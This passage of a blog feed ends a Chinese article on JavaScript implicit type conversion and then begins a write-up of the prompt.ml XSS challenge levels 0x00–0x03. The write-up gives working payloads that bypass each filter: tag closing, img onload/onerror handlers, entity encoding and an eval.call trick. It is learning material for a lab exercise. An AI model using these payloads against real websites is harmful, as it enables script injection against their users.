class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">a.valueOf(); <span class="comment">// 1515143895500</span></span><br></pre></td></tr></table></figure><p>3、除此之外返回的都为this，即对象本身：(有问题欢迎告知)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">a.valueOf() === a; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;&#125;);</span><br><span class="line">b.valueOf() === b; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>再来看看toString函数，其转换结果是什么？对于js的常见内置对象：<code>Date, Array, Math, Number, Boolean, String, Array, RegExp, Function</code>。</p><p>1、Number、Boolean、String、Array、Date、RegExp、Function这几种构造函数生成的对象，通过toString转换后会变成相应的字符串的形式，因为这些构造函数上封装了自己的toString方法。如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.prototype.hasOwnProperty(<span class="string">'toString'</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Boolean</span>.prototype.hasOwnProperty(<span class="string">'toString'</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">String</span>.prototype.hasOwnProperty(<span class="string">'toString'</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.hasOwnProperty(<span class="string">'toString'</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Date</span>.prototype.hasOwnProperty(<span class="string">'toString'</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">RegExp</span>.prototype.hasOwnProperty(<span class="string">'toString'</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.hasOwnProperty(<span class="string">'toString'</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="keyword">new</span> <span class="built_in">Number</span>(<span class="string">'123sd'</span>);</span><br><span class="line">num.toString(); <span class="comment">// 'NaN'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'12df'</span>);</span><br><span class="line">str.toString(); <span class="comment">// '12df'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bool = <span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="string">'fd'</span>);</span><br><span class="line">bool.toString(); <span class="comment">// 'true'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">arr.toString(); <span class="comment">// '1,2'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">d.toString(); <span class="comment">// "Wed Oct 11 2017 08:00:00 GMT+0800 (中国标准时间)"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">func.toString(); <span class="comment">// "function () &#123;&#125;"</span></span><br></pre></td></tr></table></figure><p>除这些对象及其实例化对象之外，其他对象返回的都是该对象的类型，(有问题欢迎告知)，都是继承的Object.prototype.toString方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;&#125;);</span><br><span class="line">obj.toString(); <span class="comment">// "[object Object]"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.toString(); <span class="comment">// "[object Math]"</span></span><br></pre></td></tr></table></figure><p>从上面valueOf和toString两个函数对对象的转换可以看出为什么对于ToPrimitive(input, PreferredType?)，PreferredType没有设定的时候，除了Date类型，PreferredType被设置为String，其它的会设置成Number。</p><p>因为valueOf函数会将Number、String、Boolean基础类型的对象类型值转换成 基础类型，Date类型转换为毫秒数，其它的返回对象本身，而toString方法会将所有对象转换为字符串。显然对于大部分对象转换，valueOf转换更合理些，因为并没有规定转换类型，应该尽可能保持原有值，而不应该想toString方法一样，一股脑将其转换为字符串。</p><p>所以对于没有指定PreferredType类型时，先进行valueOf方法转换更好，故将PreferredType设置为Number类型。</p><p>而对于Date类型，其进行valueOf转换为毫秒数的number类型。在进行隐式转换时，没有指定将其转换为number类型时，将其转换为那么大的number类型的值显然没有多大意义。（不管是在+运算符还是==运算符）还不如转换为字符串格式的日期，所以默认Date类型会优先进行toString转换。故有以上的规则：</p><p>PreferredType没有设置时，Date类型的对象，PreferredType默认设置为String，其他类型对象PreferredType默认设置为Number。</p><h4 id="22-通过tonumber将值转换为数字"><a class="markdownIt-Anchor" href="#22-通过tonumber将值转换为数字"></a> 2.2、通过ToNumber将值转换为数字</h4><p>根据参数类型进行下面转换：</p><table><thead><tr><th>参数</th><th>结果</th></tr></thead><tbody><tr><td>undefined</td><td>NaN</td></tr><tr><td>null</td><td>+0</td></tr><tr><td>布尔值</td><td>true转换1，false转换为+0</td></tr><tr><td>数字</td><td>无须转换</td></tr><tr><td>字符串</td><td>有字符串解析为数字，例如：‘324’转换为324，‘qwer’转换为NaN</td></tr><tr><td>对象(obj)</td><td>先进行 ToPrimitive(obj, Number)转换得到原始值，在进行ToNumber转换为数字</td></tr></tbody></table><h4 id="23-通过tostring将值转换为字符串"><a class="markdownIt-Anchor" href="#23-通过tostring将值转换为字符串"></a> 2.3、通过ToString将值转换为字符串</h4><p>根据参数类型进行下面转换：</p><table><thead><tr><th>参数</th><th>结果</th></tr></thead><tbody><tr><td>undefined</td><td>‘undefined’</td></tr><tr><td>null</td><td>‘null’</td></tr><tr><td>布尔值</td><td>转换为’true’ 或 ‘false’</td></tr><tr><td>数字</td><td>数字转换字符串，比如：1.765转为’1.765’</td></tr><tr><td>字符串</td><td>无须转换</td></tr><tr><td>对象(obj)</td><td>先进行 ToPrimitive(obj, String)转换得到原始值，在进行ToString转换为字符串</td></tr></tbody></table><p>讲了这么多，是不是还不是很清晰，先来看看一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&#125; + &#123;&#125;) = ?</span><br></pre></td></tr></table></figure><blockquote><p>两个对象的值进行+运算符，肯定要先进行隐式转换为原始类型才能进行计算。<br>1、进行ToPrimitive转换，由于没有指定PreferredType类型，{}会使默认值为Number，进行ToPrimitive(input, Number)运算。<br>2、所以会执行valueOf方法，({}).valueOf(),返回的还是{}对象，不是原始值。<br>3、继续执行toString方法，({}).toString(),返回&quot;[object Object]&quot;，是原始值。<br>故得到最终的结果，&quot;[object Object]&quot; + “[object Object]” = “[object Object][object Object]”</p></blockquote><p>再来一个指定类型的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 * &#123;&#125; = ?</span><br></pre></td></tr></table></figure><blockquote><p>1、首先*运算符只能对number类型进行运算，故第一步就是对{}进行ToNumber类型转换。<br>2、由于{}是对象类型，故先进行原始类型转换，ToPrimitive(input, Number)运算。<br>3、所以会执行valueOf方法，({}).valueOf(),返回的还是{}对象，不是原始值。<br>4、继续执行toString方法，({}).toString(),返回&quot;[object Object]&quot;，是原始值。<br>5、转换为原始值后再进行ToNumber运算，&quot;[object Object]&quot;就转换为NaN。<br>故最终的结果为 2 * NaN = NaN</p></blockquote><h3 id="3-运算符隐式转换"><a class="markdownIt-Anchor" href="#3-运算符隐式转换"></a> 3、== 运算符隐式转换</h3><p><strong>== 运算符的规则规律性不是那么强，按照下面流程来执行,es5文档</strong></p><blockquote><p>比较运算 x==y, 其中 x 和 y 是值，返回 true 或者 false。这样的比较按如下方式进行：</p><p>1、若 Type(x) 与 Type(y) 相同， 则</p><p>        1* 若 Type(x) 为 Undefined， 返回 true。<br>        2* 若 Type(x) 为 Null， 返回 true。<br>        3* 若 Type(x) 为 Number， 则</p><pre><code>   &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(1)、若 x 为 NaN， 返回 false。  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (2)、若 y 为 NaN， 返回 false。  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (3)、若 x 与 y 为相等数值， 返回 true。  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (4)、若 x 为 +0 且 y 为 −0， 返回 true。  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (5)、若 x 为 −0 且 y 为 +0， 返回 true。&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   (6)、返回 false。</code></pre><p>        4* 若 Type(x) 为 String, 则当 x 和 y 为完全相同的字符序列（长度相等且相同字符在相同位置）时返回 true。 否则， 返回 false。<br>        5* 若 Type(x) 为 Boolean, 当 x 和 y 为同为 true 或者同为 false 时返回 true。 否则， 返回 false。<br>        6*  当 x 和 y 为引用同一对象时返回 true。否则，返回 false。</p><p>2、若 x 为 null 且 y 为 undefined， 返回 true。<br>3、若 x 为 undefined 且 y 为 null， 返回 true。<br>4、若 Type(x) 为 Number 且 Type(y) 为 String，返回比较 x == ToNumber(y) 的结果。<br>5、若 Type(x) 为 String 且 Type(y) 为 Number，返回比较 ToNumber(x) == y 的结果。<br>6、若 Type(x) 为 Boolean， 返回比较 ToNumber(x) == y 的结果。<br>7、若 Type(y) 为 Boolean， 返回比较 x == ToNumber(y) 的结果。<br>8、若 Type(x) 为 String 或 Number，且 Type(y) 为 Object，返回比较 x == ToPrimitive(y) 的结果。<br>9、若 Type(x) 为 Object 且 Type(y) 为 String 或 Number， 返回比较 ToPrimitive(x) == y 的结果。<br>10、返回 false。</p></blockquote><p>上面主要分为两类，x、y类型相同时，和类型不相同时。</p><p>类型相同时，没有类型转换，主要注意NaN不与任何值相等，包括它自己，即NaN !== NaN。</p><p>类型不相同时，</p><blockquote><p>1、x,y 为null、undefined两者中一个   // 返回true</p><p>2、x、y为Number和String类型时，则转换为Number类型比较。</p><p>3、有Boolean类型时，Boolean转化为Number类型比较。</p><p>4、一个Object类型，一个String或Number类型，将Object类型进行原始转换后，按上面流程进行原始值比较。</p></blockquote><h4 id="31-例子解析"><a class="markdownIt-Anchor" href="#31-例子解析"></a> 3.1、== 例子解析</h4><p>所以类型不相同时，可以会进行上面几条的比较，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">'123'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="literal">true</span> == a <span class="comment">// true;</span></span><br></pre></td></tr></table></figure><blockquote><p>首先，x与y类型不同，x为boolean类型，则进行ToNumber转换为1,为number类型。<br>接着，x为number，y为object类型，对y进行原始转换，ToPrimitive(a, ?),没有指定转换类型，默认number类型。<br>而后，ToPrimitive(a, Number)首先调用valueOf方法，返回1，得到原始类型1。<br>最后 1 == 1， 返回true。</p></blockquote><p>我们再看一段很复杂的比较，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[] == !&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>1、! 运算符优先级高于==，故先进行！运算。<br>2、!{}运算结果为false，结果变成 [] == false比较。<br>3、根据上面第7条，等式右边y = ToNumber(false) = 0。结果变成 [] == 0。<br>4、按照上面第9条，比较变成ToPrimitive([]) == 0。<br>按照上面规则进行原始值转换，[]会先调用valueOf函数，返回this。<br>不是原始值，继续调用toString方法，x = [].toString() = ‘’。<br>故结果为 ‘’ == 0比较。<br>5、根据上面第5条，等式左边x = ToNumber(’’) = 0。<br>所以结果变为： 0 == 0，返回true，比较结束。</p></blockquote><p>最后我们看看文章开头说的那道题目：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  i: <span class="number">1</span>,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">1</span> &amp;&amp; a == <span class="number">2</span> &amp;&amp; a == <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello world!'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、当执行a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3 时，会从左到右一步一步解析，首先 a ==  1，会进行上面第9步转换。ToPrimitive(a， Number) == 1。</p><p>2、ToPrimitive(a, Number)，按照上面原始类型转换规则，会先调用valueOf方法，a的valueOf方法继承自Object.prototype。返回a本身，而非原始类型，故会调用toString方法。</p><p>3、因为toString被重写，所以会调用重写的toString方法，故返回1，注意这里是i++，而不是++i，它会先返回i，在将i+1。故ToPrimitive(a, Number) = 1。也就是1 == 1，此时i = 1 + 1 = 2。</p><p>4、执行完a == 1返回true，会执行a == 2，同理，会调用ToPrimitive(a, Number)，同上先调用valueOf方法，在调用toString方法，由于第一步，i = 2此时，ToPrimitive(a, Number) = 2， 也就是2 == 2, 此时i = 2 + 1。</p><p>5、同上可以推导 a == 3也返回true。故最终结果 a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3返回true</p><p>其实了解了以上隐形转换的原理，你有没有发现这些隐式转换并没有想象中那么难。</p><h4 id="参考文章es5文档"><a class="markdownIt-Anchor" href="#参考文章es5文档"></a> 参考文章：<a href="http://yanhaijing.com/es5/#103" target="_blank" rel="noopener">es5文档</a></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;作者：keenjaan&lt;br&gt;
链接：&lt;a href=&quot;https://juejin.im/post/5a7172d9f265da3e3245cbca&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://juejin.i
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="JavaScript" scheme="https://muzibing.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>This_1s_pr0mpt.ml_writeup</title>
    <link href="https://muzibing.github.io/2020/02/27/2020.02.27%EF%BC%8896%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/27/2020.02.27（96）/</id>
    <published>2020-02-26T16:00:00.000Z</published>
    <updated>2020-03-01T03:01:35.287Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这是我在无意中遇到的一个<code>xss</code> 网站，花了将近一周的时间才做完，每道题的背后都会隐藏着许多知识点，其中关于<a href="https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/">浏览器编码问题</a>，我将近用了三天的时间才搞清楚；当然还有很多知识点就不在这一一列举了，但是我会在下文中逐一进行详解。这些都不是重点，我想说的是，通过这个网站的学习，让我对 <code>xss</code> 的原理、攻击和防御都有了新的了解，这次我就借这次做题，详细系统的再总结一下 <code>xss</code> 知识点，当然这并不意味着结束了 <code>xss</code> 的学习，这只不过是一个开头，好了！步入正题。</p></blockquote><h3 id="font-color-navy0x00-简单闭合问题font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-简单闭合问题font"></a> <font color="navy">0x00 简单闭合问题</font></h3><h4 id="1-js-代码"><a class="markdownIt-Anchor" href="#1-js-代码"></a> <code>① JS 代码</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析"><a class="markdownIt-Anchor" href="#2-题目分析"></a> <code>② 题目分析</code></h4><blockquote><p>通过题目中给出的 JS 代码，可以得到：JS 直接将我们的输入进行 <code>escape</code> 编码（该方法不会对<code>ASCII 字母</code>和<code>数字进行编码</code>，也不会对<code>* @ - _ + . /</code>。其他所有的字符都会被转义序列替换），并没有经过过滤条件，相当于直接返回<code>input</code> 的输入。因为被编码后的字符还会被 JavaScript 解析器重新解析。</p></blockquote><h4 id="3-相关知识点"><a class="markdownIt-Anchor" href="#3-相关知识点"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li><code>escape</code> 函数的用法</li><li>浏览器 <code>JavaScript</code> 解析器的编码</li></ol></blockquote><h4 id="4-payload"><a class="markdownIt-Anchor" href="#4-payload"></a> <code>④ payload</code></h4><blockquote><p>根据上述分析，我们可以这样构造 <code>payload</code>：</p><p><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;//</code></p><p><strong>注</strong>：在做过第五题后，有人（比如我）可能会想这里可不可以用 <code>type=image</code> 覆盖 <code>&lt;input&gt;</code> 标中的 <code>type</code> 值，再通过 <code>onerror</code> 或者 <code>onload</code> 执行 <code>prompt(1)</code>呢？尝试之后会发现并不可行，因为<code>以第一次出现的为结果</code>。</p></blockquote><h4 id="5-html-source"><a class="markdownIt-Anchor" href="#5-html-source"></a> <code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//"&gt;</span><br></pre></td></tr></table></figure><h4 id="6-xss-类型"><a class="markdownIt-Anchor" href="#6-xss-类型"></a> <code>⑥ xss 类型</code></h4><blockquote><p>简单的标签闭合类型</p></blockquote><h3 id="font-color-navy0x01-标签闭合font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-标签闭合font"></a> <font color="navy">0x01 标签闭合</font></h3><h4 id="1-js-代码-2"><a class="markdownIt-Anchor" href="#1-js-代码-2"></a> <code>① JS 代码</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-2"><a class="markdownIt-Anchor" href="#2-题目分析-2"></a> <code>② 题目分析</code></h4><blockquote><p><code>/gi</code> 标识全局搜索匹配、不区分大小写。将匹配的替换为空，它会把所有匹配 <code>&lt;tag&gt;</code> 或 <code>&lt;/tag&gt;</code> 的标签全部剥离。由于一个标签即使没有最后面的 <code>&gt;</code> 也是可以被浏览器正确解析的。或者最后使用 <code>//</code></p></blockquote><h4 id="3-相关知识点-2"><a class="markdownIt-Anchor" href="#3-相关知识点-2"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li>JavaScript 中的 <code>replace</code> 函数知识点：<ul><li>和 <code>python</code> 中的 <code>replace</code> 的区别</li><li>它的一些特性，将会在下文中接触</li></ul></li><li><code>&lt;img&gt;</code> 标签的 <code>onload</code> 和 <code>onerror</code> 的区别</li></ol></blockquote><h4 id="4-payload-2"><a class="markdownIt-Anchor" href="#4-payload-2"></a> <code>④ payload</code></h4><blockquote><p><code>onload</code> 有关的 payload：</p><p><strong>注</strong>：<code>onload</code> 事件会在页面或图像加载完成后立即发生。</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://muzibing.github.io/images/95-1.png"</span> <span class="attr">onload</span>=<span class="string">prompt(1)</span> //</span></span><br><span class="line">&lt;body onload="prompt(1)"</span><br></pre></td></tr></table></figure><blockquote><p><code>onerror</code> 有关的 payload：</p><p><strong>注</strong>：<code>onerror</code> 事件当错误发生时运行脚本。</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span> = <span class="string">prompt(1)</span> //  (<span class="attr">src</span>引用的图片不存在则执行<span class="attr">onerror</span>事件）</span></span><br><span class="line">&lt;input src = # type = "image" onerror = prompt(1) //</span><br></pre></td></tr></table></figure><h4 id="5-html-source-2"><a class="markdownIt-Anchor" href="#5-html-source-2"></a> <code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onload:</span><br><span class="line">================================================================================</span><br><span class="line">&lt;article&gt;&lt;img src="https://muzibing.github.io/images/95-1.png" onload=prompt(1) //&lt;/article&gt;</span><br><span class="line">&lt;article&gt;&lt;body onload="prompt(1)"&lt;/article&gt;</span><br><span class="line">    </span><br><span class="line">onerror:</span><br><span class="line">================================================================================</span><br><span class="line">&lt;article&gt;&lt;img src="#" onerror = prompt(1) //&lt;/article&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">src</span> = <span class="string">#</span> <span class="attr">type</span> = <span class="string">"image"</span> <span class="attr">onerror</span> = <span class="string">"prompt(1)"</span></span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-2"><a class="markdownIt-Anchor" href="#6-xss-类型-2"></a> <code>⑥ xss 类型</code></h4><blockquote><p>通过标签特性绕过正则表达式的过滤，再利用标签的事件，来达到 xss 攻击目的。</p></blockquote><h3 id="font-color-navy0x02-实体编码绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-实体编码绕过font"></a> <font color="navy">0x02 实体编码绕过</font></h3><h4 id="1-js-代码-3"><a class="markdownIt-Anchor" href="#1-js-代码-3"></a> <code>① JS 代码</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-3"><a class="markdownIt-Anchor" href="#2-题目分析-3"></a> <code>② 题目分析</code></h4><blockquote><p>JS 代码的作用是将 <code>=</code> 或 <code>(</code> 过滤掉，然后返回输出。</p></blockquote><h4 id="3-相关知识点-3"><a class="markdownIt-Anchor" href="#3-相关知识点-3"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li><code>escape</code> 函数的作用</li><li><code>&lt;svg&gt;</code> 的特性：<code>&lt;svg&gt;</code> 直接继承自 XML，一般情况下，它的解析规则为：除非被 <code>CDATA</code> 包围，否则实体编码都会被转义。</li><li><code>eval.call</code> 的功能</li></ol></blockquote><h4 id="4-payload-3"><a class="markdownIt-Anchor" href="#4-payload-3"></a> <code>④ payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1:<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>上面的 <code>payload</code> 是通过 <code>&lt;svg&gt;</code> 标签的特性，在 <code>JS 解析器</code> 解码之前，<code>HTML 解析</code> 会将 <code>&lt;svg&gt;</code> 字符串中中的实体编码解码，所以能够执行成功。</p><p><strong>注</strong>：本人憨批了一把，当时想既然可以用 <code>HTML</code> 实体字符绕过，那么可不可以用 <code>URL 编码</code> 或者   <code>JavaScript 编码</code> 呢？第二个想法真的相当于憨批了，因为 <code>escape</code> 函数就是用来解码 <code>JavaScript 编码</code> 的，肯定不能绕过呀！第一个想法还靠点谱，还想了一个 <code>payload</code>：</p><p><code>&lt;a href = &quot;javascript:prompt%281%29&quot;&gt;test&lt;/a&gt;</code> 看着还挺靠谱，可是已经忘了给定了匹配规则：将 <code>=</code> 或 <code>(</code> 过滤掉，然后返回输出。所以 <code>=</code> 在这里就被清除了。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2:<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;<span class="string">'prompt\x281)'</span>&#125;</span>`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="5-html-source-3"><a class="markdownIt-Anchor" href="#5-html-source-3"></a> <code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-3"><a class="markdownIt-Anchor" href="#6-xss-类型-3"></a> <code>⑥ xss 类型</code></h4><blockquote><p>实体编码绕过。当然也有 <code>URL</code> 和 <code>JS</code> 编码绕过，这个得根据实际来看。</p></blockquote><h3 id="font-color-navy0x03-闭合注释font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-闭合注释font"></a> <font color="navy">0x03 闭合注释</font></h3><h4 id="1-js-代码-4"><a class="markdownIt-Anchor" href="#1-js-代码-4"></a> <code>① JS 代码</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span 